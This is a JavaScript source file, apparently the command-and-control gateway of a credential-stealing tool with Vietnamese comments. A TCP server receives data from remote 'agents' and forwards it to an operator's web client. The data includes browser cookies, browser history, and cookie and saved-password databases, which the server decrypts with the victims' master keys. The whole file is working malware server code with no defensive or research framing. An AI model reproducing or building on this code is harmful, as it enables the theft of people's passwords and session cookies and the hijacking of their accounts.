// --- Module: TCP Server for Agent Communication ---
const net = require("net");
const WebSocket = require("ws");
const { CFG } = require("./config");
const { filterBestCookies } = require("./utils");
const { parseBrowserHistory, decryptPasswords, decryptCookies } = require("./decryption");

// Tham chiếu tới agents map và webClient
let agents = null;
let getWebClient = null;

function initTcpServer(agentsMap, webClientGetter) {
    agents = agentsMap;
    getWebClient = webClientGetter;
    
    const tcpServer = net.createServer((socket) => {
        const id = socket.remoteAddress;
        socket.setEncoding("utf8");
        socket.setNoDelay(true); // Disable Nagle's algorithm for low latency

        let agent = agents.get(id);
        if (agent?.socket) agent.socket.destroy();
        
        agent = { 
            id, socket, buffer: "", lastSeen: Date.now(),
            info: { ip: id, hostname: "Unknown", os: "Unknown" }
        };
        agents.set(id, agent);
        console.log(`[TCP] Agent connected: ${id}`);

        socket.on("data", (chunk) => {
            agent.buffer += chunk;
            agent.lastSeen = Date.now();

            let idx;
            while ((idx = agent.buffer.indexOf("\n")) !== -1) {
                const line = agent.buffer.slice(0, idx).trim();
                agent.buffer = agent.buffer.slice(idx + 1);
                if (!line) continue;

                try {
                    const msg = JSON.parse(line);
                    handleAgentMessage(msg, agent, id);
                } catch (e) { /* Ignore JSON Error */ }
            }
        });

        socket.on("error", (e) => console.error(`[TCP] Error ${id}: ${e.message}`));
        socket.on("close", () => {
            console.log(`[TCP] Disconnect: ${id}`);
            // Xóa agent khỏi Map ngay khi disconnect để scan list cập nhật real-time
            agents.delete(id);
        });
    });

    tcpServer.listen(CFG.AGENT_PORT, "0.0.0.0", () => {
        console.log(`[Gateway] TCP listening on 0.0.0.0:${CFG.AGENT_PORT}`);
    });

    return tcpServer;
}

function handleAgentMessage(msg, agent, id) {
    const webClient = getWebClient();
    
    // === A. XỬ LÝ COOKIE TỪ CDP (QUAN TRỌNG NHẤT) ===
    if (msg.type === "cookies_result") {
        const rawCount = msg.data ? msg.data.length : 0;
        console.log(`[Gateway] Received ${rawCount} cookies from ${msg.browser}. Filtering...`);
        
        // LỌC COOKIE TRƯỚC KHI GỬI XUỐNG UI
        if (rawCount > 0) {
            msg.data = filterBestCookies(msg.data);
            console.log(`[Gateway] Filtered: ${rawCount} -> ${msg.data.length} clean cookies.`);
        }

        if (webClient?.readyState === WebSocket.OPEN) {
            msg.agentId = id;
            webClient.send(JSON.stringify(msg));
        }
        return; // Đã xử lý xong, không forward mặc định
    }

    // === B. XỬ LÝ COOKIE TỪ DB FILE (LEGACY) ===
    if (msg.type === "cookies_package_multi") {
        console.log(`[Gateway] Processing DB Cookies from ${msg.browser}...`);
        let allCookies = [];
        for (const dbInfo of msg.dbs) {
            const cookies = decryptCookies(msg.master_key, dbInfo.data);
            if (cookies.length > 0) allCookies = allCookies.concat(cookies);
        }
        
        // Lọc cả loại này luôn cho chắc
        const cleanCookies = filterBestCookies(allCookies);

        if (webClient?.readyState === WebSocket.OPEN) {
            webClient.send(JSON.stringify({
                type: "cookies_result",
                browser: msg.browser,
                data: cleanCookies
            }));
        }
        return;
    }

    // === C. XỬ LÝ PASSWORD AUTO (TẤT CẢ BROWSER) ===
    if (msg.type === "passwords_auto_result") {
        handlePasswordsAutoResult(msg, webClient);
        return;
    }

    // === E. XỬ LÝ BROWSER HISTORY ===
    if (msg.type === "browser_history" && msg.success && msg.historyDb) {
        console.log(`[Gateway] Processing browser history from ${msg.browser}...`);
        const history = parseBrowserHistory(msg.historyDb, msg.isFirefox, msg.limit || 500);
        console.log(`[Gateway] Parsed ${history.length} history entries`);
        
        if (webClient?.readyState === WebSocket.OPEN) {
            webClient.send(JSON.stringify({
                type: "browser_history_result",
                browser: msg.browser,
                success: true,
                data: history
            }));
        }
        return;
    }

    // === D. CÁC TIN KHÁC (FORWARD) ===
    if (msg.type === "hello") {
        agent.info = { ...agent.info, hostname: msg.hostname, os: msg.os };
        console.log(`[TCP] Registered: ${agent.info.hostname} (${id})`);
    } else if (msg.type !== "heartbeat") {
        if (webClient?.readyState === WebSocket.OPEN) {
            msg.agentId = id;
            webClient.send(JSON.stringify(msg));
        }
    }
}

function handlePasswordsAutoResult(msg, webClient) {
    let allPasswords = [];
    const browserList = msg.browsers || [];

    for (const browserData of browserList) {
        const dbs = browserData.dbs || [];

        for (const dbInfo of dbs) {
            let rawContent = dbInfo.content || dbInfo.data;
            if (!rawContent) continue;

            // Skip file > 50MB
            if (rawContent.length / 1024 / 1024 > 50) continue;

            try {
                const passwords = decryptPasswords(browserData.master_key, rawContent);
                passwords.forEach(p => p.browser = browserData.browser);
                allPasswords = allPasswords.concat(passwords);
            } catch (err) { /* Skip error */ }
        }
    }

    if (webClient && webClient.readyState === WebSocket.OPEN) {
        webClient.send(JSON.stringify({
            type: "passwords_result",
            browser: "All Browsers",
            data: allPasswords,
            warning: allPasswords.length === 0 ? "Decrypt OK but 0 passwords found." : null
        }));
    }
}

module.exports = {
    initTcpServer
};
